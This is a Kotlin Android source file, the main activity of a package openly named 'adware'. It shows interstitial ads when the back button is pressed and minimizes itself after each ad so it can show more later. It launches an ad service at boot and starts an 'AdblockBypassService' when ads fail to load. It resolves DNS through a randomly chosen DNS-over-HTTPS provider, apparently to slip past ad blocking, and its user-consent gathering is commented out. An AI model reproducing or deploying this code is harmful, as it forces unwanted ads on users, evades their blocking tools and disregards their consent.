package com.addroid.adware

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.PopupMenu
import android.widget.Toast
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import com.addroid.adware.databinding.ActivityMainBinding
import com.google.android.gms.ads.AdError
import com.google.android.gms.ads.AdRequest
import com.google.android.gms.ads.FullScreenContentCallback
import com.google.android.gms.ads.LoadAdError
import com.google.android.gms.ads.MobileAds
import com.google.android.gms.ads.RequestConfiguration
import com.google.android.gms.ads.interstitial.InterstitialAd
import com.google.android.gms.ads.interstitial.InterstitialAdLoadCallback
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.Dns
import okhttp3.HttpUrl.Companion.toHttpUrl
import okhttp3.OkHttpClient
import okhttp3.dnsoverhttps.DnsOverHttps
import java.util.concurrent.atomic.AtomicBoolean
import com.addroid.adware.Constants.Companion.DOH_PROVIDER_URLS
import com.addroid.adware.Constants.Companion.TAG
import com.addroid.adware.Constants.Companion.TEST_DEVICE_HASHED_ID
import com.addroid.adware.Constants.Companion.AD_UNIT_ID
import com.addroid.adware.Constants.Companion.GAME_LENGTH_MILLISECONDS


class MainActivity : AppCompatActivity() {
    var bootstrapClient: OkHttpClient = OkHttpClient()
    val DohNum = (0..49).random()
    var DnsVar: Dns = DnsOverHttps.Builder().client(bootstrapClient)
        .url(DOH_PROVIDER_URLS[DohNum].toHttpUrl())
        .build()
    var client: OkHttpClient = OkHttpClient.Builder().dns(DnsVar).build()

  private val isMobileAdsInitializeCalled = AtomicBoolean(false)
  private lateinit var binding: ActivityMainBinding
  private lateinit var googleMobileAdsConsentManager: GoogleMobileAdsConsentManager
  private var interstitialAd: InterstitialAd? = null
  private var countdownTimer: CountDownTimer? = null
  private var gamePaused = false
  private var gameOver = false
  private var adIsLoading: Boolean = false
  private var timerMilliseconds = 0L
  private var minimized: Boolean = false

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    initializeMobileAdsSdk()
    loadAd()
    val intentReceived = getIntent()
    if (intentReceived.getStringExtra("BootReceived")?.equals("1") == true) {
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        applicationContext.startForegroundService(Intent(applicationContext, AdsService::class.java))
      } else {
        applicationContext.startService(Intent(applicationContext, AdsService::class.java))
      }
    }
    onBackPressedDispatcher.addCallback(this) {
      showInterstitial()
    }
    binding = ActivityMainBinding.inflate(layoutInflater)
    val view = binding.root
    setContentView(view)
    binding.retryButton.visibility = View.INVISIBLE

    // Log the Mobile Ads SDK version.
    Log.d(TAG, "Google Mobile Ads SDK Version: " + MobileAds.getVersion())

    googleMobileAdsConsentManager = GoogleMobileAdsConsentManager.getInstance(this)
    //googleMobileAdsConsentManager.gatherConsent(this) { consentError ->
    //  if (consentError != null) {
    //    Log.w(TAG, "${consentError.errorCode}: ${consentError.message}")
    //  }
    //  if (googleMobileAdsConsentManager.isPrivacyOptionsRequired) {
    //    invalidateOptionsMenu()
    //   }
    //}
    //initializeMobileAdsSdk()
    //loadAd()
    binding.retryButton.visibility = View.INVISIBLE
    binding.retryButton.setOnClickListener { showInterstitial() }
    showInterstitial()
  }

  private fun loadAd() {
    // Request a new ad if one isn't already loaded.
    if (adIsLoading || interstitialAd != null) {
      return
    }
    else {
        adIsLoading = true

        // [START load_ad]
        InterstitialAd.load(
            this,
            AD_UNIT_ID,
            AdRequest.Builder().build(),
            object : InterstitialAdLoadCallback() {
                override fun onAdLoaded(ad: InterstitialAd) {
                    Log.d(TAG, "Ad was loaded.")
                    interstitialAd = ad
                    // [START_EXCLUDE silent]
                    adIsLoading = false
                    // [END_EXCLUDE]
                }

                override fun onAdFailedToLoad(adError: LoadAdError) {
                    Log.d(TAG, adError.message)
                    interstitialAd = null
                    // [START_EXCLUDE silent]
                    adIsLoading = false
                    Toast.makeText(
                        this@MainActivity,
                        "Ad failed to load",
                        Toast.LENGTH_SHORT,
                    )
                        .show()
                    applicationContext.stopService(
                        Intent(
                            this@MainActivity,
                            AdsService::class.java
                        )
                    )
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        applicationContext.startForegroundService(
                            Intent(
                                this@MainActivity,
                                AdblockBypassService::class.java
                            )
                        )
                    } else {
                        applicationContext.startService(
                            Intent(
                                this@MainActivity,
                                AdblockBypassService::class.java
                            )
                        )
                    }
                    finish()
                    // [END_EXCLUDE]
                }
            },
        )
    }
    // [END load_ad]
  }

  override fun onCreateOptionsMenu(menu: Menu?): Boolean {
    menuInflater.inflate(R.menu.action_menu, menu)
    return super.onCreateOptionsMenu(menu)
  }

  override fun onOptionsItemSelected(item: MenuItem): Boolean {
    val menuItemView = findViewById<View>(item.itemId)
    val activity = this
    PopupMenu(this, menuItemView).apply {
      menuInflater.inflate(R.menu.popup_menu, menu)
      menu
        .findItem(R.id.privacy_settings)
        .setVisible(googleMobileAdsConsentManager.isPrivacyOptionsRequired)
      show()
      setOnMenuItemClickListener { popupMenuItem ->
        when (popupMenuItem.itemId) {
          R.id.privacy_settings -> {
            pauseGame()
            // Handle changes to user consent.
            googleMobileAdsConsentManager.showPrivacyOptionsForm(activity) { formError ->
              if (formError != null) {
                Toast.makeText(activity, formError.message, Toast.LENGTH_SHORT).show()
              }
              resumeGame()
            }
            true
          }
          R.id.ad_inspector -> {
            MobileAds.openAdInspector(activity) { error ->
              // Error will be non-null if ad inspector closed due to an error.
              error?.let { Toast.makeText(activity, it.message, Toast.LENGTH_SHORT).show() }
            }
            true
          }
          // Handle other branches here.
          else -> false
        }
      }
      return super.onOptionsItemSelected(item)
    }
  }



  private fun createTimer(milliseconds: Long) {
    countdownTimer?.cancel()

    countdownTimer =
      object : CountDownTimer(milliseconds, 50) {
        override fun onTick(millisUntilFinished: Long) {
          timerMilliseconds = millisUntilFinished
          binding.timer.text = "seconds remaining: ${ millisUntilFinished / 1000 + 1 }"
        }

        override fun onFinish() {
          gameOver = true
          binding.timer.text = "done!"
          showInterstitial()
        }
      }

    countdownTimer?.start()
  }

  // Show the ad if it's ready
  private fun showInterstitial() {
    if (interstitialAd != null) {
      // [START set_fullscreen_callback]
      interstitialAd?.fullScreenContentCallback =
        object : FullScreenContentCallback() {
          override fun onAdDismissedFullScreenContent() {
            // Called when fullscreen content is dismissed.
            Log.d(TAG, "Ad was dismissed.")
            // Don't forget to set the ad reference to null so you
            // don't show the ad a second time.
            interstitialAd = null
            loadAd()
            minimizeApp()
          }

          override fun onAdFailedToShowFullScreenContent(adError: AdError) {
            // Called when fullscreen content failed to show.
            Log.d(TAG, "Ad failed to show.")
            // Don't forget to set the ad reference to null so you
            // don't show the ad a second time.
            interstitialAd = null
          }

          override fun onAdShowedFullScreenContent() {
            // Called when fullscreen content is shown.
            Log.d(TAG, "Ad showed fullscreen content.")
          }

          override fun onAdImpression() {
            // Called when an impression is recorded for an ad.
            Log.d(TAG, "Ad recorded an impression.")
          }

          override fun onAdClicked() {
            // Called when ad is clicked.
            Log.d(TAG, "Ad was clicked.")
          }
        }
      // [END set_fullscreen_callback]

      // [START show_ad]
      interstitialAd?.show(this)
      // [END show_ad]
    } else {
      startGame()
      if (googleMobileAdsConsentManager.canRequestAds) {  
        loadAd()
        showInterstitial()
      } 
    }
  }

  private fun startGame() {
    binding.retryButton.visibility = View.INVISIBLE
    createTimer(GAME_LENGTH_MILLISECONDS)
    gamePaused = false
    gameOver = false
  }

  private fun pauseGame() {
    if (gameOver || gamePaused) {
      return
    }
    countdownTimer?.cancel()
    gamePaused = true
  }

  private fun resumeGame() {
    if (gameOver || !gamePaused) {
      return
    }
    createTimer(timerMilliseconds)
    gamePaused = true
  }

  private fun initializeMobileAdsSdk() {
    if (isMobileAdsInitializeCalled.getAndSet(true)) {
      return
    }

    // Set your test devices.
    MobileAds.setRequestConfiguration(
      RequestConfiguration.Builder().setTestDeviceIds(listOf(TEST_DEVICE_HASHED_ID)).build()
    )

    CoroutineScope(Dispatchers.IO).launch {
      // Initialize the Google Mobile Ads SDK on a background thread.
      MobileAds.initialize(this@MainActivity) {}
      runOnUiThread {
        // Load an ad on the main thread.
        loadAd()
      }
    }
      Log.d(TAG, "Initialized Ad SDK")
  }

  // Resume the game if it's in progress.
  public override fun onResume() {
    super.onResume()
    resumeGame()
  }

  public override fun onPause() {
    super.onPause()
    pauseGame()
  }

  private fun minimizeApp() {
        minimized = true
        val startMain = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_HOME)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(startMain)
    }

  override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        Log.d(TAG, "Received intent, "+minimized.toString())
        if (minimized) {
            showInterstitial()
        }
    }
}
